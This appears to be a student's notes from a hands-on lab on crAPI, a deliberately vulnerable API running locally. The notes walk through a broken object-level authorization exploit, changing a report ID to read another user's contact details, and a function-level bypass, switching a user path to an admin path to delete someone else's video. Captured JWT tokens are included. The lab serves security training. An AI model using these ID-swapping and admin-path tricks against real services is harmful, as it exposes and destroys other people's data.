
Instructor starts in the localhost:8888/dashboard 

From there we click on the button Contact Mechanic

from there we get a form about contacting a mechanic, we enter our VIN, Mechanic name, and then a problem description and we click send service request.

in the problem description we type in test_data_123 so it can be identifiable in the burp suite history.

In the burp suite history there is one POST request, and we come across /workship/api/merchant/contact_mechanic

from here we take a look at the request, and we see this 

```json
{"mechanic_code":"TRAC_JHN","problem_details":"test_data_123","vin":"1GIGF95XMMN431588","mechanic_api":"http://localhost:8888/workshop/api/mechanic/receive_report","repeat_request_if_failed":false,"number_of_repeats":1}
```

and if we look at the response we see this:

```json
{"response_from_mechanic_api":{"id":6,"sent":true,"report_link":"http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=6"},"status":200}
```

we take note of this hidden API called `/api/mechanic/receive_report`

We go to postman, we create a new GET request 

the url for the GET request will be 
`http://localhost:8888/workshop/api/mechanic/mechanic_report?report_id=4`

taking note that we changed the id from 6 to 4

and we get back this:

```json
{
    "id": 4,
    "mechanic": {
        "id": 2,
        "mechanic_code": "TRAC_JME",
        "user": {
            "email": "james@example.com",
            "number": ""
        }
    },
    "vehicle": {
        "id": 2,
        "vin": "8VAUI03PRUQ686911",
        "owner": {
            "email": "pogba006@example.com",
            "number": "9876570006"
        }
    },
    "problem_details": "My car MG Motor - Hector Plus is having issues.\nCan you give me a call on my mobile 9876570006,\nOr send me an email at pogba006@example.com\nThanks,\nPogba.\n",
    "status": "pending",
    "created_on": "14 January, 2025, 04:09:09"
}
```


Something to note here is that while testing in postman, we had to grab the users Authorization cookie 
`Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJKb2huQHRlc3QuY29tIiwiaWF0IjoxNzM2OTQ3MzIzLCJleHAiOjE3Mzc1NTIxMjMsInJvbGUiOiJ1c2VyIn0.kkLCY-CN0pGy8m8fRZPCf2m9EYhfO3ihwJu4zXzt0L6Y0wnQTJtINRXVa9_DHkFukbvLwlGe4qIJp2OCO5LBnYro7Z4KhXgTSsBfcuALE2KcJpcvtCK45klBB5f0qc47tFqHm5jfkePLD7hw-gOnYKAu27AvtvLL8fwhWBM6a9cIF63PRq9aJIsno2N7ZqVgnUUK50p2yxj77Xv6HrTn61aL7uGLMRI_HafBSI7yvITxN2gUPiCf3NDLrX0unQIAInR3yjxRsHRxERHVmRRkIDPWkY37SL3vMEaLC0pEEX1EOGtFQ5BgcLTH2KDQjirlpQeAPiQ_hiTCFVwSms8Zvw`

and use it in the postman request, in the headers tab and this shows that our user John had access to someone else data proving BOLA.

Okay from here we move onto BFLA

we visit localhost:8888/my-profile

and we upload a video located at
┌──(kali㉿kali)-[~/Documents/labs/crAPI/postman_collections]
└─$ ls     
car.mp4  crAPI.postman_collection.json  crAPI.postman_environment.json

From here we look at the POST request that was captured in burpsuite and the POST request was sent at /identity/api/v2/user/videos

From here we look at the response and we see that the response has an object called

```json
{"id":52,"video_name":"car.mp4","conversion_params":"-v codec h264","profileVideo":....
```


okay so now we know that our video is numbered id 52

we go to postman

we go to the request
Post - signup example.com

we sign up a user

we get
{
    "message": "User registered successfully! Please Login.",
    "status": 200
}

from there we go to the GET request Login, we click Send

we get 

{
    "token": "eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJDYXJsb3MuU3RldWJlckBleGFtcGxlLmNvbSIsImlhdCI6MTczNjk3MzkzMywiZXhwIjoxNzM3NTc4NzMzLCJyb2xlIjoidXNlciJ9.SSbn3GH5QbvMN0Xb2NY7RC0HtxyrradbjUqJSA-d9TXQnfQev_namgF78ameMJ9JkY_tERJSHi2w9nJRP0xU7gNnPzcOWDQrOTQipNNFCPra2MjPiBd42X6OgaC5wyNQmqoJN0m105pV5f_CXbXZrLF4cHPlVf5PSt90mk5Yg64fwneooCHwU879jhCbyDMD4VjMmL28Howd5Z0KkyjOVawp_wrMfdx9b628fI2ySdRYQDN8BARRCO30LuMEv2UnOKysFx9HOitMAha2UXBM0y4OqsiejpaWqZP8VkOakRqQnxJI4v-HJLsyFgHdU4RpkES-wWwUHNHC3xu-uu48TQ",
    "type": "Bearer",
    "message": "Login successful",
    "mfaRequired": false
}

then we go to Post request 
Verify JWT Token, we click send and we get

{
    "message": "The token is a valid JWT token",
    "status": 200
}

then go and add a new video using the POST request named Add new Video

we go to Body tab, we click on form-data, they key is named file and value we can upload our mp4 file from the labs folder
once the video is uploaded we see we get 

"id": 53,
    "video_name": "car.mp4",
    "conversion_params": "-v codec h264",
    "profileVideo": "data:image/jpeg;base64,AAAAIGZ0eXBpc29tAAACAGlzb21pc28yYXZjMW1wNDEAAAAIZnJlZQADYhVtZGF0AAAACwYAB4D3MQAbd0CAAAAACAYBBAAACBCAAAABs2W4BAB/7IN6KT/

from here lets see if we can delete our user John video proving BFLA



we go to the DEL request named Delete Video and we get 

{
    "message": "This is an admin function. Try to access the admin API",
    "status": 403
}

when trying to delete video id 52

so the instructor says if we simply change the url from

{{url}}/identity/api/v2/user/videos/{{video_id}}

to 

{{url}}/identity/api/v2/admin/videos/{{video_id}}

then it should work, we make the changes and we get 

{
    "message": "User video deleted successfully.",
    "status": 200
}

this proves BLFA